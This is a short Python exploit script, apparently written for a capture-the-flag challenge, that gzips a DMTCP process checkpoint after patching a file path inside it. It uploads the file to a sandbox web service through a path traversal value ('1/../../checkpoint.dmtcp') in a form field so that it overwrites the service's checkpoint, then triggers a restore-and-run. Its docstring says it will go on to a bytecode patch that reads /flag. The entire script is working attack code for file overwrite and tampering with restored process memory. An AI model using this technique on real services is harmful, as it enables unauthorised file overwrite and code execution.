"""Patch pristine snapshot: swap 'latest.txt' -> 'status.txt' (same length).
Upload & run — if primes appear in status.txt, memory-patching a checkpoint works,
and we can escalate to a bytecode patch that reads /flag."""
import gzip, requests, sys

URL = sys.argv[1] if len(sys.argv) > 1 else \
    'https://8000-76df56ad42634ea9acf04c4e6016b534.sbx.secso.cc'

raw = open('snap_pristine.dmtcp', 'rb').read()
plain = gzip.decompress(raw)
print(f'pristine decompressed: {len(plain)} bytes')

# Byte swap 'latest.txt' -> 'status.txt' inside the '/app/data/output/latest.txt' path string.
old = b'/app/data/output/latest.txt'
new = b'/app/data/output/status.txt'
count = plain.count(old)
print(f'found {count} occurrences of {old.decode()!r}')
patched = plain.replace(old, new)
print(f'after patch, {patched.count(new)} occurrences of new path')

comp = gzip.compress(patched, compresslevel=6)
print(f'recompressed: {len(comp)} bytes')

r = requests.post(f"{URL}/api/config",
    data={'timestamp': '1/../../checkpoint.dmtcp'},
    files={'config': ('x.dmtcp', comp, 'application/octet-stream')},
    timeout=60)
print(f'upload: {r.status_code} {r.text[:200]}')

r = requests.post(f"{URL}/api/run", timeout=60)
print(f'\nrun: {r.status_code}')
print(r.text[:1500])
